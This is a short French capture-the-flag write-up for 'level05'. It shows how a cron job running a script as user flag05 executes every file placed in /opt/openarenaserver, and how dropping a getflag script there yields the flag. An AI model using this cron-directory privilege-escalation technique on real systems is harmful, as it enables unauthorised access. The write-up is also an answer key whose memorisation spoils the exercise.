En se connectant au level 05, le message "You have new mail" s'affiche sur la sortie standard.
On retrouve rapidement en fouillant un peu, un dossier /rofs/var/mail qui contient un fichier level05.
Celui correspond a un cron job :
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

Il execute toutes les 2 minutes le script mentionne avec les droits de flag05.
Le script en question ressemble a ceci :
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

Il execute donc, avant de les supprimer, tous les fichiers contenus dans le chemin mentionne. Ainsi, on peut faire executer un fichier a flag05 en le placant dans ce dossier :
getflag > /tmp/flag.txt
Puis
chmod +x script.sh
Au bout de 2 minutes, on ira verifier dans le chemin mentionne, et le fichier contiendra le resultat de la commande getflag.
